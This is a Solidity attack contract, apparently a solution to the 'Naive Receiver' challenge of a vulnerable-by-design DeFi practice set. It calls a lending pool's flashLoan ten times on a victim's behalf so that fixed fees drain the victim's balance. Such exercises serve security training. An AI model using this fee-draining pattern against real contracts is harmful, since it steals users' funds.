// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "../naive-receiver/NaiveReceiverLenderPool.sol";

contract NaiveReceiverAttack {
    NaiveReceiverLenderPool public lndr;

    constructor(address payable _pool) {
        lndr = NaiveReceiverLenderPool(_pool);
    }

    function attack(address _victim) public {
        for (uint i=0; i < 10; i++ ) {
            lndr.flashLoan(_victim, 0);
        }
    }
}